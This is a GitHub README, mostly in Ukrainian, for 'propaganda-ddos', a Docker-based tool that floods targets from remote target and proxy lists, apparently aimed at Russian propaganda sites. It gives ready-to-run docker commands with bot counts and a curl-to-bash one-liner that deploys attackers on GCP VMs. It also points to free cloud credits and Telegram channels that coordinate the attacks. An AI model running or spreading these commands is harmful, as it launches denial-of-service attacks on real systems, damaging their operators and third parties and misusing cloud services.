# propaganda-ddos
### Переваги
- Підгружає цілі та проксі динамічно із вказаних прапорцями джерел (--proxy, --sites)
- Якщо є зміни в джерелах, програма їх бачить підвантажує оновлені дані
- Перевіряє на валідність цілі та резолвить хости перед атакою (DNS resolution)
- Перевіряє на валідність проксі
- Не вижирає багато пам'яті (ідеально для мікро-інстансів)
- Багатопотоковість з одного контейнера
- Розумний вибір цілей: якщо ціль лежить або не відповідає -- перестаємо колупати
- Для запуску потрібен лише Docker

```bash
docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=69 \
--dnsres=true --errcount=69 --onlyproxy=false --bots 69 --checkproxy=true \
--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
--proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
```
```bash
# Щоб побачити логи
docker logs antiprop -f
```


### Запуск в GCP VMs / Run in GCP VMs
```bash
# Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 69
```
![image](https://user-images.githubusercontent.com/25509048/156889923-0a3bd42b-5ee0-466c-8e48-b8295cead812.png)

### Використання / Usage
```bash
docker run --rm lovefromukraine/antiprop --help
```

### Де запускати? / Where to run?
- [Guide GCP (free 300$)](https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit) 
- [Microsoft Azure (free 200$)](https://dou.ua/forums/topic/36795/?from=fptech)
- [Amazon AWS (free 200$)](https://www.youtube.com/playlist?list=PLY1sAemBLA5ztXFauZJU1b292umoWMeZ4)

# Coordination
- https://t.me/itarmyofukraine2022 (english posts are included)
- https://t.me/ddosKotyky
- https://t.me/incourse911
